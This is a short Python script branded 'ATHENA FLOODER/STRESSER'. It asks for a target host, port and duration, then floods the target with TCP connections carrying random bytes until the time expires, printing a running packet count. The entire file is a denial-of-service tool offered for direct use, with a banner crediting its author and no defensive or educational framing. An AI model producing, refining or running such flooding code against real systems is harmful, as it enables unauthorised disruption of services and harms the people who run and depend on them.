import os
import sys
import time
import socket
import random
import colorama
from colorama import Fore

def Stresser(host,port=80,duration=100):
    timeout = time.time() + int(duration)
    sent = 0
    while True:
        try:
            if time.time() > timeout:
                break

            else:
                pass
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            bytes = random._urandom(1024)
            sock.connect((host, port))
            sock.sendto(bytes, (host, port))
            sent = sent + 1
            print(Fore.GREEN+'[✘] Sent %s packets to %s through port %s' % (sent, host, port))

        except KeyboardInterrupt:
            sys.exit()


if __name__ == '__main__':
    colorama.init()
    print(Fore.GREEN+"""
        ------------------------------
        ✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮
        ------------------------------
        ###############################
        #   ✮       ATHENA       ✮   #
        #   ✮  FLOODER/STRESSER  ✮   #
        ###############################
        ✮ Coded by RedSoftware ✮
        ###############################
        ✮ IG:@redsoftwareofficial ✮
        ###############################
        ------------------------------
        ✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮
        ------------------------------
        """)
    host = input(Fore.RED+'☑ Host/IP: ')
    port = int(input(Fore.RED+'☑ Port: '))
    duration = int(input(Fore.RED+'☑ Time: '))
    Stresser(host,port,duration)







